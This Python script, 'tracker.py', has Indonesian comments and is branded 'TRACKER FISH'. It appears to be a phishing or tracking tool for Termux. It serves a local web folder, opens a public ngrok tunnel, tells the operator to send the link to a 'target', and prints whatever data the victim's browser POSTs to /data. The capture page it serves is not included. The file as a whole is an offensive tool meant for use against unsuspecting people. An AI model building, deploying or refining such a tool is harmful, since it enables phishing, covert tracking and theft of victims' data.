# tracker.py

import http.server
import socketserver
import os
import time
from pyngrok import ngrok
import signal
import sys
import platform
from urllib.parse import urlparse
from shutil import which
from datetime import datetime
import socket  # <-- Tambahan untuk cek DNS

# =========================
# KONFIGURASI
# =========================
PORT = 8080
FOLDER_NAME = "server"
CLEAR_COMMAND = "clear" if os.name == "posix" else "cls"

# =========================
# UTILITAS TERMINAL
# =========================
def clear_screen():
    try:
        os.system(CLEAR_COMMAND)
    except Exception:
        pass

def print_banner():
    print("=" * 25)
    print("     TRACKER FISH       ")
    print("  By: Peju 3ncer 🗥️     ")
    print("=" * 25)

# =========================
# CEK LINGKUNGAN TERMUX
# =========================
def cek_folder_server():
    try:
        full_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), FOLDER_NAME)
        if not os.path.exists(full_path):
            print(f"[X] Folder '{FOLDER_NAME}' tidak ditemukan di path: {full_path}")
            sys.exit(1)
        os.chdir(full_path)
    except Exception as e:
        print(f"[X] Gagal mengakses folder server: {e}")
        sys.exit(1)

def cek_ngrok_terinstal():
    if which("ngrok") is None:
        print("[X] Ngrok belum terinstal di Termux!")
        print("Silakan jalankan perintah berikut:")
        print("""
pkg install wget unzip -y
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
unzip ngrok-stable-linux-arm.zip
mv ngrok /data/data/com.termux/files/usr/bin
chmod +x /data/data/com.termux/files/usr/bin/ngrok
""")
        sys.exit(1)

def tampilkan_info_sistem():
    print(f"📱 Platform   : {platform.system()} {platform.machine()}")
    print(f"🕒 Sekarang   : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"📂 Direktori  : {os.getcwd()}")
    print(f"🔌 Port       : {PORT}")

# =========================
# CEK DNS NGROK (UNTUK TERMUX)
# =========================
def cek_dns_ngrok():
    try:
        socket.gethostbyname("connect.us.ngrok-agent.com")
        return True
    except:
        return False

# =========================
# NGROK SETUP
# =========================
def buat_ngrok_tunnel(port):
    try:
        tunnel = ngrok.connect(port, "http")
        if not tunnel:
            raise Exception("Tunnel kosong.")
        return tunnel.public_url
    except Exception as e:
        print(f"[X] Gagal membuat tunnel ngrok: {e}")
        sys.exit(1)

# =========================
# HANDLER KUSTOM UNTUK POST
# =========================
class CustomHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/data':
            try:
                length = int(self.headers.get('Content-Length', 0))
                data = self.rfile.read(length)
                decoded = data.decode('utf-8', errors='replace')
                print("\n[📡 Data Diterima!]")
                print(decoded)
                self.send_response(200)
                self.end_headers()
            except Exception as e:
                print(f"[X] Gagal menangani POST: {e}")
                self.send_response(500)
                self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        return  # Matikan log HTTP default biar bersih

# =========================
# SERVER STARTER
# =========================
def mulai_server():
    try:
        with socketserver.TCPServer(("", PORT), CustomHandler) as httpd:
            print(f"[√] Server aktif di: http://localhost:{PORT}")
            print("[⌛] Menunggu target mengakses...\n")
            httpd.serve_forever()
    except OSError:
        print(f"[X] Port {PORT} sedang digunakan. Ubah port atau tutup aplikasi lain.")
        sys.exit(1)
    except Exception as e:
        print(f"[X] Error saat menjalankan server: {e}")
        sys.exit(1)

# =========================
# EXIT HANDLER (Ctrl+C)
# =========================
def handle_exit(sig, frame):
    print("\n[!] Dihentikan oleh user.")
    try:
        ngrok.kill()
    except:
        pass
    print("[✓] Semua koneksi dihentikan. Keluar dengan aman.")
    sys.exit(0)

# =========================
# MAIN FUNCTION
# =========================
def main():
    signal.signal(signal.SIGINT, handle_exit)
    signal.signal(signal.SIGTERM, handle_exit)

    clear_screen()
    print_banner()
    tampilkan_info_sistem()

    cek_folder_server()
    cek_ngrok_terinstal()

    try:
        user_input = input("\nKetik 'MASUK' untuk mulai: ").strip().lower()
        if user_input != "masuk":
            print("[!] Perintah tidak dikenali. Program dibatalkan.")
            sys.exit(0)
    except KeyboardInterrupt:
        handle_exit(None, None)

    # Cek DNS Ngrok sebelum bikin tunnel
    if not cek_dns_ngrok():
        print("[X] Tidak bisa resolve domain ngrok.")
        print("💡 Jalankan ini di Termux:")
        print("echo 'nameserver 8.8.8.8' > $PREFIX/etc/resolv.conf")
        print("🔌 Atau pastikan koneksi internet lancar.")
        sys.exit(1)

    print("\n[🔗] Membuat tunnel dengan ngrok...")
    public_url = buat_ngrok_tunnel(PORT)
    print("\n[🌍] Kirim link ini ke target:")
    print(public_url)
    print()

    mulai_server()

# =========================
# ENTRY POINT
# =========================
if __name__ == "__main__":
    main()
